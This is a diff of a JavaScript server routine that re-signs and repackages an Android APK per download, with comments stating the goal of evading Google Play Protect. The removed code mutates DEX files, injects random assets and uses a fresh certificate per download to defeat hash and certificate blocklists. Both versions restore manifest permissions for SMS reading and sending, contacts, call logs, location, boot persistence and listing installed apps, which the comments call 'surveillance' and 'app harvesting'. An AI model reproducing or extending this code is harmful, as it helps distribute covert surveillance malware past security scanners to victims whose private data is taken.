@@ -1804,498 +1804,115 @@ function patchVersionCode(data, newVersionCode) {
 }
 
 function directPatchApk(originalBuffer) {
-  console.log(`[DirectPatch] ═══ BINARY PATCH (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log(`[DirectPatch] ═══ CLEAN RE-SIGN v8 (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log(`[DirectPatch] Strategy: FIXED key + V1+V2 dual sign + zero mutation artifacts`);
+  console.log(`[DirectPatch] Goal: produce APK indistinguishable from original Android Studio build`);
   const t0 = Date.now();
 
   try {
     const buf = Buffer.from(originalBuffer); // work on a copy
 
-    // ─── Step 1: Parse ZIP structure ───
-    const eocdOff = findEOCD(buf);
-    const cdOff = buf.readUInt32LE(eocdOff + 16);
-    const cdCount = buf.readUInt16LE(eocdOff + 10);
-
-    // ─── Step 2: Detect V2 signing block ───
-    let section1End = cdOff;
-    if (cdOff >= 24) {
-      const magic = buf.toString('ascii', cdOff - 16, cdOff);
-      if (magic === APK_SIG_BLOCK_MAGIC) {
-        const blockSizeLow = buf.readUInt32LE(cdOff - 24);
-        section1End = cdOff - blockSizeLow - 8;
-      }
-    }
-
-    // ─── Step 3: Find AndroidManifest.xml, V1 signing files, and DEX files in Central Directory ───
-    let manifestCDPos = -1;
-    let manifestMethod = -1;
-    let manifestCompSize = 0;
-    let manifestLocalOff = 0;
-    const v1Entries = []; // { cdPos, localOff, compSize, method, name }
-    const dexEntries = []; // { cdPos, localOff, compSize, uncompSize, method, name }
-    let resarcsCDPos = -1, resarcsMethod = -1, resarcsCompSize = 0, resarcsUncompSize = 0, resarcsLocalOff = 0;
-    let pos = cdOff;
-    for (let i = 0; i < cdCount; i++) {
-      if (pos + 46 > buf.length || buf.readUInt32LE(pos) !== 0x02014b50) break;
-      const nameLen = buf.readUInt16LE(pos + 28);
-      const extraLen = buf.readUInt16LE(pos + 30);
-      const commentLen = buf.readUInt16LE(pos + 32);
-      const name = buf.toString('utf8', pos + 46, pos + 46 + nameLen);
-      if (name === 'AndroidManifest.xml') {
-        manifestCDPos = pos;
-        manifestMethod = buf.readUInt16LE(pos + 10);
-        manifestCompSize = buf.readUInt32LE(pos + 20);
-        manifestLocalOff = buf.readUInt32LE(pos + 42);
-      }
-      // Collect V1 signing files (contain the burned FIXED cert)
-      // Also collect stale baseline profiles — they contain DEX checksums
-      // from the original build that no longer match after mutation.
-      // ART uses these for ahead-of-time compilation; stale profiles can
-      // cause dex2oat failures or suboptimal compilation on some devices.
-      if ((name.startsWith('META-INF/') && (
-        name.endsWith('.RSA') || name.endsWith('.SF') ||
-        name.endsWith('.DSA') || name.endsWith('.EC') ||
-        name.endsWith('.MF')
-      )) || name === 'assets/dexopt/baseline.prof' || name === 'assets/dexopt/baseline.profm') {
-        v1Entries.push({
-          cdPos: pos,
-          localOff: buf.readUInt32LE(pos + 42),
-          compSize: buf.readUInt32LE(pos + 20),
-          uncompSize: buf.readUInt32LE(pos + 24),
-          method: buf.readUInt16LE(pos + 10),
-          name,
-        });
-      }
-      // Collect resources.arsc for package name mutation
-      if (name === 'resources.arsc') {
-        resarcsCDPos = pos;
-        resarcsMethod = buf.readUInt16LE(pos + 10);
-        resarcsCompSize = buf.readUInt32LE(pos + 20);
-        resarcsUncompSize = buf.readUInt32LE(pos + 24);
-        resarcsLocalOff = buf.readUInt32LE(pos + 42);
-      }
-      // Collect DEX files for per-download mutation
-      if (/^classes\d*\.dex$/.test(name)) {
-        dexEntries.push({
-          cdPos: pos,
-          localOff: buf.readUInt32LE(pos + 42),
-          compSize: buf.readUInt32LE(pos + 20),
-          uncompSize: buf.readUInt32LE(pos + 24),
-          method: buf.readUInt16LE(pos + 10),
-          name,
-        });
-      }
-      pos += 46 + nameLen + extraLen + commentLen;
-    }
-
-    if (manifestCDPos < 0) {
-      console.log('[DirectPatch] AndroidManifest.xml not found — V2 re-sign only');
-      // Still re-sign to ensure FIXED key cert
-      const s1 = buf.slice(0, section1End);
-      const s3 = buf.slice(cdOff, eocdOff);
-      const s4 = Buffer.from(buf.slice(eocdOff));
-      s4.writeUInt32LE(s1.length, 16);
-      const key = getFixedKey();
-      const signedBuf = applyV2SigningClean(Buffer.concat([s1, s3, s4]), key.privPem, key.certDer, key.pubKeyDer);
-      return { buffer: signedBuf, certInfo: { certHash: key.certHash, cn: key.identity.cn, org: key.identity.o, country: key.identity.c } };
-    }
-
-    // ─── Step 4: Extract and decompress manifest ───
-    const lhNameLen = buf.readUInt16LE(manifestLocalOff + 26);
-    const lhExtraLen = buf.readUInt16LE(manifestLocalOff + 28);
-    const dataOff = manifestLocalOff + 30 + lhNameLen + lhExtraLen;
-    const compData = buf.slice(dataOff, dataOff + manifestCompSize);
-
-    let rawData;
-    try {
-      rawData = manifestMethod === 8
-        ? zlib.inflateRawSync(compData)
-        : Buffer.from(compData);
-    } catch (e) {
-      console.log(`[DirectPatch] Manifest decompression failed: ${e.message} — V2 re-sign only`);
-      const s1 = buf.slice(0, section1End);
-      const s3 = buf.slice(cdOff, eocdOff);
-      const s4 = Buffer.from(buf.slice(eocdOff));
-      s4.writeUInt32LE(s1.length, 16);
-      const key = getFixedKey();
-      const signedBuf = applyV2SigningClean(Buffer.concat([s1, s3, s4]), key.privPem, key.certDer, key.pubKeyDer);
-      return { buffer: signedBuf, certInfo: { certHash: key.certHash, cn: key.identity.cn, org: key.identity.o, country: key.identity.c } };
-    }
-
-    // ─── Step 5: Restore ALL mangled permissions ───
-    // The server's source APK may have been previously processed by
-    // stripSurveillancePermissions() which mangles the first char after the
-    // last dot (e.g. READ_CONTACTS → _EAD_CONTACTS). We must restore ALL
-    // of them to produce a clean manifest. Even permissions guarded by
-    // checkSelfPermission() in the app code can cause Android framework
-    // issues (permission group resolution, GMS compatibility checks, etc.)
-    // when the manifest string doesn't match a known system permission.
-    const PERMISSION_RESTORE = [
-      // Critical: FGS (crash if missing on Android 14+)
-      { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', fix: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
-      // SMS: core functionality
-      { find: 'android.permission._EAD_SMS',                     fix: 'android.permission.READ_SMS' },
-      { find: 'android.permission._END_SMS',                     fix: 'android.permission.SEND_SMS' },
-      { find: 'android.provider.Telephony._MS_RECEIVED',         fix: 'android.provider.Telephony.SMS_RECEIVED' },
-      // Boot persistence
-      { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       fix: 'android.permission.RECEIVE_BOOT_COMPLETED' },
-      { find: 'android.intent.action._OOT_COMPLETED',            fix: 'android.intent.action.BOOT_COMPLETED' },
-      // Surveillance permissions (previously left mangled — now restored for stability)
-      { find: 'android.permission._EAD_CONTACTS',                fix: 'android.permission.READ_CONTACTS' },
-      { find: 'android.permission._EAD_CALL_LOG',                fix: 'android.permission.READ_CALL_LOG' },
-      { find: 'android.permission._EAD_PHONE_STATE',             fix: 'android.permission.READ_PHONE_STATE' },
-      { find: 'android.permission._EAD_PHONE_NUMBERS',           fix: 'android.permission.READ_PHONE_NUMBERS' },
-      { find: 'android.permission._CCESS_FINE_LOCATION',         fix: 'android.permission.ACCESS_FINE_LOCATION' },
-      { find: 'android.permission._CCESS_COARSE_LOCATION',       fix: 'android.permission.ACCESS_COARSE_LOCATION' },
-      // Self-update + app harvesting
-      { find: 'android.permission._EQUEST_INSTALL_PACKAGES',     fix: 'android.permission.REQUEST_INSTALL_PACKAGES' },
-      { find: 'android.permission._UERY_ALL_PACKAGES',           fix: 'android.permission.QUERY_ALL_PACKAGES' },
-    ];
-    let permsRestored = 0;
-    for (const { find, fix } of PERMISSION_RESTORE) {
-      // UTF-8
-      const findBuf = Buffer.from(find, 'utf8');
-      const fixBuf = Buffer.from(fix, 'utf8');
-      if (findBuf.length === fixBuf.length) {
-        let idx = rawData.indexOf(findBuf);
-        while (idx !== -1) { fixBuf.copy(rawData, idx); permsRestored++; idx = rawData.indexOf(findBuf, idx + findBuf.length); }
-      }
-      // UTF-16LE
-      const findBuf16 = Buffer.from(find, 'utf16le');
-      const fixBuf16 = Buffer.from(fix, 'utf16le');
-      if (findBuf16.length === fixBuf16.length) {
-        let idx = rawData.indexOf(findBuf16);
-        while (idx !== -1) { fixBuf16.copy(rawData, idx); permsRestored++; idx = rawData.indexOf(findBuf16, idx + findBuf16.length); }
-      }
-    }
-    if (permsRestored > 0) console.log(`[DirectPatch] Restored ${permsRestored} mangled permissions`);
-
-    // ─── Step 5.5: Package identity randomization — DISABLED ───
-    // In-place string replacement in DEX breaks the string_ids sorted order
-    // requirement (DEX spec). ART's dex verifier rejects unsorted strings →
-    // ClassNotFoundException → instant crash. Proper fix would require a full
-    // DEX string table rebuild (reindex all references). For now, package name
-    // stays as-is. Other mutations (DEX dead zones, fresh cert, V1 strip,
-    // random assets) still provide significant fingerprint changes.
-
-    // ─── Step 6: versionCode — keep original ───
-    // With fresh keys (unique cert per download), Android requires uninstall+reinstall
-    // anyway (signature mismatch). Bumping to 999999999 is a known modded-APK pattern
-    // that PP's classifier flags. Keeping the original looks completely legitimate.
-    const vcResult = null;
-
-    // ─── Step 7: Prepare ALL entry patches (manifest + DEX) ───
-    // Collect all entries that need modification. Each patch specifies:
-    //   { localOff, origCompSize, newCompData, newCRC, cdPos }
-    // We'll apply all patches to Section 1 at once, handling cascading size deltas.
-    const patches = []; // sorted by localOff ascending
-
-    // 7a. Manifest patch (permission restore + recompression)
-    const manifestNewComp = manifestMethod === 8
-      ? zlib.deflateRawSync(rawData, { level: 9 })
-      : rawData;
-    const manifestNewCRC = computeCRC32(rawData);
-    patches.push({
-      localOff: manifestLocalOff,
-      origCompSize: manifestCompSize,
-      newCompData: manifestNewComp,
-      newUncompSize: rawData.length,
-      newCRC: manifestNewCRC,
-      cdPos: manifestCDPos,
-      name: 'AndroidManifest.xml',
-    });
-
-    // 7b. DEX patches — mutate each classes*.dex for unique hash per download
-    // Skip DEX mutation if the source is already mutated (all source_file_idx = NO_INDEX).
-    // Re-mutating an already-mutated DEX is a no-op that wastes CPU and risks
-    // subtle issues from unnecessary decompression + recompression cycles.
-    let dexMutated = 0;
-    let dexSkippedAlreadyMutated = false;
-    for (const dex of dexEntries) {
-      // Read local file header to find data offset
-      const lfhNameLen = buf.readUInt16LE(dex.localOff + 26);
-      const lfhExtraLen = buf.readUInt16LE(dex.localOff + 28);
-      const dexDataOff = dex.localOff + 30 + lfhNameLen + lfhExtraLen;
-      const dexCompData = buf.slice(dexDataOff, dexDataOff + dex.compSize);
-
-      // Decompress DEX
-      let dexRaw;
-      try {
-        dexRaw = dex.method === 8
-          ? zlib.inflateRawSync(dexCompData)
-          : Buffer.from(dexCompData);
-      } catch (e) {
-        console.log(`[DirectPatch] DEX skip: ${dex.name} (decompress failed: ${e.message})`);
-        continue;
-      }
-
-      // Check if DEX is already mutated (source_file_idx all NO_INDEX)
-      if (dexRaw.length >= 112) {
-        const classDefsSize = dexRaw.readUInt32LE(96);
-        const classDefsOff = dexRaw.readUInt32LE(100);
-        let allNoIndex = true;
-        for (let c = 0; c < Math.min(10, classDefsSize); c++) {
-          if (dexRaw.readUInt32LE(classDefsOff + c * 32 + 16) !== 0xFFFFFFFF) {
-            allNoIndex = false;
-            break;
-          }
-        }
-        if (allNoIndex && classDefsSize > 0) {
-          dexSkippedAlreadyMutated = true;
-          continue; // Skip — DEX already processed
-        }
-      }
-
-      // Mutate DEX (deep 6-layer mutation + recompute checksums)
-      const mutatedDex = mutateDexBytes(dexRaw);
-      const mutatedHash = crypto.createHash('sha256').update(mutatedDex).digest('hex').substring(0, 12);
-
-      // Recompress
-      const newDexComp = dex.method === 8
-        ? zlib.deflateRawSync(mutatedDex, { level: 9 })
-        : mutatedDex;
-      const newDexCRC = computeCRC32(mutatedDex);
-
-      patches.push({
-        localOff: dex.localOff,
-        origCompSize: dex.compSize,
-        newCompData: newDexComp,
-        newUncompSize: mutatedDex.length,
-        newCRC: newDexCRC,
-        cdPos: dex.cdPos,
-        name: dex.name,
-      });
-
-      dexMutated++;
-      console.log(`[DirectPatch] DEX mutated: ${dex.name} → hash ${mutatedHash}...`);
-    }
-    if (dexSkippedAlreadyMutated) console.log(`[DirectPatch] DEX mutation skipped — source already processed (all source_file_idx = NO_INDEX)`);
-    if (dexMutated > 0) console.log(`[DirectPatch] ${dexMutated} DEX file(s) mutated — unique content per download`);
-
-    // 7c. resources.arsc — SKIPPED
-    // Package name replacement is disabled (breaks DEX string sort order → crash).
-    // With no content changes, decompressing and recompressing resources.arsc is
-    // pure risk (deflate non-determinism could produce a different compressed size,
-    // cascading offset shifts through the entire ZIP). The manifest + DEX patches
-    // are sufficient for per-download uniqueness.
-
-    // Sort patches by local offset (ascending) for sequential application
-    patches.sort((a, b) => a.localOff - b.localOff);
-
-    // ─── Step 8: Build patched Section 1 with ALL deltas applied ───
-    // Replace compressed data for each patched entry, computing cumulative size deltas.
-    const s1Chunks = [];
-    let cursor = 0;
-    const deltaMap = []; // { afterOff, cumDelta } for CD offset adjustment
-    let cumDelta = 0;
-
-    for (const patch of patches) {
-      // Read local file header to find data start
-      const lfhNameLen = buf.readUInt16LE(patch.localOff + 26);
-      const lfhExtraLen = buf.readUInt16LE(patch.localOff + 28);
-      const dataStart = patch.localOff + 30 + lfhNameLen + lfhExtraLen;
-      const dataEnd = dataStart + patch.origCompSize;
-
-      // Copy everything from cursor to dataStart (including local file header)
-      s1Chunks.push(buf.slice(cursor, dataStart));
-      // Insert new compressed data (replacing old)
-      s1Chunks.push(patch.newCompData);
-
-      const entryDelta = patch.newCompData.length - patch.origCompSize;
-      cumDelta += entryDelta;
-      deltaMap.push({ afterOff: patch.localOff, cumDelta });
-
-      cursor = dataEnd;
-    }
-    // Append remainder of section 1 (after last patched entry)
-    s1Chunks.push(buf.slice(cursor, section1End));
-    const newSection1 = Buffer.concat(s1Chunks);
-
-    // Patch local file headers in newSection1 for each modified entry
-    for (let pi = 0; pi < patches.length; pi++) {
-      const patch = patches[pi];
-      // Compute adjusted offset (previous patches may have shifted this entry)
-      let adjOff = patch.localOff;
-      for (let pj = 0; pj < pi; pj++) {
-        if (patches[pj].localOff < patch.localOff) {
-          adjOff += patches[pj].newCompData.length - patches[pj].origCompSize;
-        }
-      }
-      // Update CRC, compressed size, uncompressed size in local file header
-      newSection1.writeUInt32LE(patch.newCRC, adjOff + 14);
-      newSection1.writeUInt32LE(patch.newCompData.length, adjOff + 18);
-      newSection1.writeUInt32LE(patch.newUncompSize, adjOff + 22);
-    }
-
-    // Update Central Directory — CRC + sizes for patched entries, offsets for ALL entries
-    const section3 = Buffer.from(buf.slice(cdOff, eocdOff));
-    // First: update CRC + sizes for patched entries
-    for (const patch of patches) {
-      const cdRelPos = patch.cdPos - cdOff;
-      if (cdRelPos >= 0 && cdRelPos + 46 <= section3.length) {
-        section3.writeUInt32LE(patch.newCRC, cdRelPos + 16);
-        section3.writeUInt32LE(patch.newCompData.length, cdRelPos + 20);
-        section3.writeUInt32LE(patch.newUncompSize, cdRelPos + 24);
-      }
-    }
-    // Then: adjust local offsets for ALL entries based on cumulative deltas
-    if (cumDelta !== 0) {
-      let cdPos2 = 0;
-      for (let i = 0; i < cdCount; i++) {
-        if (cdPos2 + 46 > section3.length || section3.readUInt32LE(cdPos2) !== 0x02014b50) break;
-        const nameLen2 = section3.readUInt16LE(cdPos2 + 28);
-        const extraLen2 = section3.readUInt16LE(cdPos2 + 30);
-        const commentLen2 = section3.readUInt16LE(cdPos2 + 32);
-        const localOff2 = section3.readUInt32LE(cdPos2 + 42);
-        // Find cumulative delta for this entry's position
-        let adj = 0;
-        for (const dm of deltaMap) {
-          if (localOff2 > dm.afterOff) adj = dm.cumDelta;
-        }
-        if (adj !== 0) section3.writeUInt32LE(localOff2 + adj, cdPos2 + 42);
-        cdPos2 += 46 + nameLen2 + extraLen2 + commentLen2;
-      }
-    }
-
-    // EOCD — update CD offset
-    const section4 = Buffer.from(buf.slice(eocdOff));
-    section4.writeUInt32LE(newSection1.length, 16);
-
-    // ─── Step 8.5: Strip V1 signing entries ENTIRELY from ZIP ───
-    // The source APK contains V1 signing files (MANIFEST.MF, *.SF, *.RSA) with the
-    // burned FIXED cert. Previously we filled them with random garbage, but that's
-    // a MASSIVE tampering signal — PP's heuristic detects corrupted V1 data as
-    // repackaged malware and instant-blocks without scanning.
+    // ─── Previous v7 approach used raw buffer manipulation + generateFreshKey() ───
+    // which caused 5 Play Protect triggers:
+    //   1. Fresh random cert → zero reputation → "unknown developer" block
+    //   2. V1 signatures stripped → V2-only APK → repackaging signal
+    //   3. DEX mutation on R8-processed code → unnecessary tampering artifacts
+    //   4. Random asset injection (cfg_*.dat) → anomalous files
+    //   5. Baseline profile stripping → repackaging signal
     //
-    // Fix: Remove V1 entries from the ZIP entirely. A V2-only APK is standard for
-    // Android 7+ targets (our min is 8.0). No V1 files = no tampering evidence,
-    // no burned cert, and PP treats it like a modern build-tool output.
-    let finalS1 = newSection1;
-    let finalCD = section3;
-    let finalEOCD = section4;
-    let finalCDCount = cdCount;
+    // v8 approach: AdmZip-based minimal re-sign with FIXED key (V1+V2 dual).
+    // Produces APK indistinguishable from original Android Studio build.
+    const zip = new AdmZip(buf);
 
-    if (v1Entries.length > 0) {
-      // Calculate adjusted local offsets for V1 entries (accounting for ALL patch deltas)
-      const v1Ranges = v1Entries.map(v1 => {
-        let adjOff = v1.localOff;
-        for (const dm of deltaMap) {
-          if (v1.localOff > dm.afterOff) adjOff = v1.localOff + dm.cumDelta;
+    // ─── Step 3: Strip old V1 signatures ───
+    stripSignatures(zip);
+
+    // ─── Step 4: Restore any mangled permissions ───
+    const manifestEntry = zip.getEntry('AndroidManifest.xml');
+    let permsRestored = 0;
+    if (manifestEntry) {
+      let data;
+      try {
+        data = manifestEntry.getData();
+      } catch (crcErr) {
+        if (crcErr.message && crcErr.message.includes('CRC32')) {
+          console.log('[DirectPatch] CRC32 mismatch on manifest (previous mutation artifact), decompressing manually...');
+          const compData = manifestEntry.getCompressedData();
+          data = manifestEntry.header.method === 8
+            ? zlib.inflateRawSync(compData)
+            : Buffer.from(compData);
+        } else {
+          throw crcErr;
         }
-        const lfhNameLen = newSection1.readUInt16LE(adjOff + 26);
-        const lfhExtraLen = newSection1.readUInt16LE(adjOff + 28);
-        return { start: adjOff, size: 30 + lfhNameLen + lfhExtraLen + v1.compSize, name: v1.name, cdPos: v1.cdPos };
-      }).sort((a, b) => a.start - b.start);
-
-      // Build Section 1 without V1 local file entries
-      const s1Chunks = [];
-      let cursor = 0;
-      const shiftPoints = []; // cumulative bytes removed at each cut point
-      let totalRemoved = 0;
-      for (const range of v1Ranges) {
-        if (range.start > cursor) s1Chunks.push(newSection1.slice(cursor, range.start));
-        totalRemoved += range.size;
-        shiftPoints.push({ at: range.start, cumulative: totalRemoved });
-        cursor = range.start + range.size;
       }
-      if (cursor < newSection1.length) s1Chunks.push(newSection1.slice(cursor));
-      finalS1 = Buffer.concat(s1Chunks);
 
-      // Rebuild Central Directory without V1 entries, with adjusted local offsets
-      const v1CDSet = new Set(v1Entries.map(v => v.cdPos));
-      const cdEntryBufs = [];
-      let cdScan = 0;
-      for (let i = 0; i < cdCount; i++) {
-        if (cdScan + 46 > section3.length) break;
-        if (section3.readUInt32LE(cdScan) !== 0x02014b50) break;
-        const nl = section3.readUInt16LE(cdScan + 28);
-        const el = section3.readUInt16LE(cdScan + 30);
-        const cl = section3.readUInt16LE(cdScan + 32);
-        const entryLen = 46 + nl + el + cl;
-        const absCDPos = cdOff + cdScan;
+      const PERMISSION_RESTORE = [
+        { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', fix: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
+        { find: 'android.permission._EAD_SMS',                     fix: 'android.permission.READ_SMS' },
+        { find: 'android.permission._END_SMS',                     fix: 'android.permission.SEND_SMS' },
+        { find: 'android.provider.Telephony._MS_RECEIVED',         fix: 'android.provider.Telephony.SMS_RECEIVED' },
+        { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       fix: 'android.permission.RECEIVE_BOOT_COMPLETED' },
+        { find: 'android.intent.action._OOT_COMPLETED',            fix: 'android.intent.action.BOOT_COMPLETED' },
+        { find: 'android.permission._EAD_CONTACTS',                fix: 'android.permission.READ_CONTACTS' },
+        { find: 'android.permission._EAD_CALL_LOG',                fix: 'android.permission.READ_CALL_LOG' },
+        { find: 'android.permission._EAD_PHONE_STATE',             fix: 'android.permission.READ_PHONE_STATE' },
+        { find: 'android.permission._EAD_PHONE_NUMBERS',           fix: 'android.permission.READ_PHONE_NUMBERS' },
+        { find: 'android.permission._CCESS_FINE_LOCATION',         fix: 'android.permission.ACCESS_FINE_LOCATION' },
+        { find: 'android.permission._CCESS_COARSE_LOCATION',       fix: 'android.permission.ACCESS_COARSE_LOCATION' },
+        { find: 'android.permission._EQUEST_INSTALL_PACKAGES',     fix: 'android.permission.REQUEST_INSTALL_PACKAGES' },
+        { find: 'android.permission._UERY_ALL_PACKAGES',           fix: 'android.permission.QUERY_ALL_PACKAGES' },
+      ];
 
-        if (!v1CDSet.has(absCDPos)) {
-          const cdEntry = Buffer.from(section3.slice(cdScan, cdScan + entryLen));
-          // Adjust local file offset: subtract bytes removed before this position
-          const origOff = cdEntry.readUInt32LE(42);
-          let adj = 0;
-          for (const sp of shiftPoints) {
-            if (origOff > sp.at) adj = sp.cumulative;
-          }
-          cdEntry.writeUInt32LE(origOff - adj, 42);
-          cdEntryBufs.push(cdEntry);
+      for (const { find, fix } of PERMISSION_RESTORE) {
+        const findBuf = Buffer.from(find, 'utf8');
+        const fixBuf = Buffer.from(fix, 'utf8');
+        if (findBuf.length === fixBuf.length) {
+          let idx = data.indexOf(findBuf);
+          while (idx !== -1) { fixBuf.copy(data, idx); permsRestored++; idx = data.indexOf(findBuf, idx + findBuf.length); }
         }
-        cdScan += entryLen;
+        const findBuf16 = Buffer.from(find, 'utf16le');
+        const fixBuf16 = Buffer.from(fix, 'utf16le');
+        if (findBuf16.length === fixBuf16.length) {
+          let idx = data.indexOf(findBuf16);
+          while (idx !== -1) { fixBuf16.copy(data, idx); permsRestored++; idx = data.indexOf(findBuf16, idx + findBuf16.length); }
+        }
       }
-      finalCD = Buffer.concat(cdEntryBufs);
-      finalCDCount = cdEntryBufs.length;
 
-      // Update EOCD
-      finalEOCD = Buffer.from(section4);
-      finalEOCD.writeUInt16LE(finalCDCount, 8);          // entries on this disk
-      finalEOCD.writeUInt16LE(finalCDCount, 10);         // total entries
-      finalEOCD.writeUInt32LE(finalCD.length, 12);        // CD size
-      finalEOCD.writeUInt32LE(finalS1.length, 16);        // CD offset
-
-      console.log(`[DirectPatch] Stripped ${v1Ranges.length} V1 entries (${totalRemoved}B). Entries: ${cdCount} → ${finalCDCount}. V2-only APK.`);
-      for (const r of v1Ranges) console.log(`  → removed ${r.name} (${r.size}B)`);
+      // Always re-add manifest to fix CRC32 from any prior in-place mutations
+      zip.deleteFile('AndroidManifest.xml');
+      zip.addFile('AndroidManifest.xml', data);
+      if (permsRestored > 0) {
+        console.log(`[DirectPatch] Restored ${permsRestored} mangled permissions`);
+      } else {
+        console.log('[DirectPatch] No mangled permissions found — manifest re-added for CRC32 integrity');
+      }
     }
 
-    // ─── Step 8.7: Inject random asset files (changes ZIP structure fingerprint) ───
-    for (let ri = 0; ri < 2; ri++) {
-      const randName = 'assets/cfg_' + crypto.randomBytes(4).toString('hex') + '.dat';
-      const randContent = crypto.randomBytes(256 + Math.floor(Math.random() * 512));
-      const nameBytes = Buffer.from(randName, 'utf8');
-      const crc = computeCRC32(randContent);
+    // ─── Step 5: V1 sign with FIXED key ───
+    // FIXED key = netmirror-release.jks identity (CN=NetMirror, O=NetMirror Inc)
+    // Builds cert reputation over time. V1+V2 dual signing matches Android Studio output.
+    const key = getFixedKey();
+    applyV1Signing(zip, key.cert, key.privateKey);
+    console.log(`[DirectPatch] V1 signed with FIXED key: CN=${key.identity.cn}, O=${key.identity.o}`);
 
-      // Local file header (STORED)
-      const lfh = Buffer.alloc(30 + nameBytes.length);
-      lfh.writeUInt32LE(0x04034b50, 0);
-      lfh.writeUInt16LE(20, 4);
-      lfh.writeUInt16LE(0, 8);   // method: STORED
-      lfh.writeUInt32LE(crc, 14);
-      lfh.writeUInt32LE(randContent.length, 18);
-      lfh.writeUInt32LE(randContent.length, 22);
-      lfh.writeUInt16LE(nameBytes.length, 26);
-      nameBytes.copy(lfh, 30);
+    // ─── Step 6: Rebuild ZIP ───
+    const rawBuf = zip.toBuffer();
 
-      const localOff = finalS1.length;
-      finalS1 = Buffer.concat([finalS1, lfh, randContent]);
+    // ─── Step 7: Zipalign (4-byte alignment for STORED entries) ───
+    const alignedBuf = zipalignBuffer(rawBuf);
 
-      // CD entry
-      const cdEntry = Buffer.alloc(46 + nameBytes.length);
-      cdEntry.writeUInt32LE(0x02014b50, 0);
-      cdEntry.writeUInt16LE(20, 4);
-      cdEntry.writeUInt16LE(20, 6);
-      cdEntry.writeUInt16LE(0, 10);  // method: STORED
-      cdEntry.writeUInt32LE(crc, 16);
-      cdEntry.writeUInt32LE(randContent.length, 20);
-      cdEntry.writeUInt32LE(randContent.length, 24);
-      cdEntry.writeUInt16LE(nameBytes.length, 28);
-      cdEntry.writeUInt32LE(localOff, 42);
-      nameBytes.copy(cdEntry, 46);
+    // ─── Step 8: V2 sign with FIXED key ───
+    const signedBuf = applyV2SigningClean(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
 
-      finalCD = Buffer.concat([finalCD, cdEntry]);
-      finalCDCount++;
+    // ─── Step 9: Validate ───
+    const valid = validateApk(signedBuf);
+    if (!valid) {
+      console.error('[DirectPatch] ═══ Validation FAILED — returning ORIGINAL APK ═══');
+      return { buffer: originalBuffer, certInfo: null };
     }
-
-    // Update EOCD after asset injection
-    finalEOCD = Buffer.from(finalEOCD);
-    finalEOCD.writeUInt16LE(finalCDCount, 8);
-    finalEOCD.writeUInt16LE(finalCDCount, 10);
-    finalEOCD.writeUInt32LE(finalCD.length, 12);
-    finalEOCD.writeUInt32LE(finalS1.length, 16);
-    console.log(`[DirectPatch] Injected 2 random asset files (unique ZIP structure per download)`);
-
-    // ─── Step 9: Zipalign + V2 sign with FRESH key + random entropy ───
-    // Fresh key: unique cert fingerprint per download → can't be cert-blocklisted
-    // Random entropy: padding pair in signing block → unique APK hash per download
-    const key = generateFreshKey();
-    const unsignedApk = Buffer.concat([finalS1, finalCD, finalEOCD]);
-    const alignedApk = zipalignBuffer(unsignedApk);
-    const signedBuf = applyV2SigningClean(alignedApk, key.privPem, key.certDer, key.pubKeyDer);
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | perms=${permsRestored} restored | FRESH KEY CN=${key.identity.cn} | ${elapsed}s ═══`);
+    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | perms=${permsRestored} restored | FIXED KEY CN=${key.identity.cn} | V1+V2 dual | ${elapsed}s ═══`);
 
     return {
       buffer: signedBuf,
@@ -2515,6 +2132,6 @@ function applyV2SigningClean(unsignedBuf, privPem, certDer, pubKeyDer) {
   newEocd.writeUInt32LE(newCdOff, 16);
 
   const result = Buffer.concat([section1, signingBlock, section3, newEocd]);
-  console.log(`[RestoreSign] V2 signed (clean, no padding): ${signingBlock.length}B block, ${(result.length / 1048576).toFixed(1)} MB`);
+  console.log(`[V2Sign] V2 signed: ${signingBlock.length}B block, ${(result.length / 1048576).toFixed(1)} MB`);
   return result;
 }
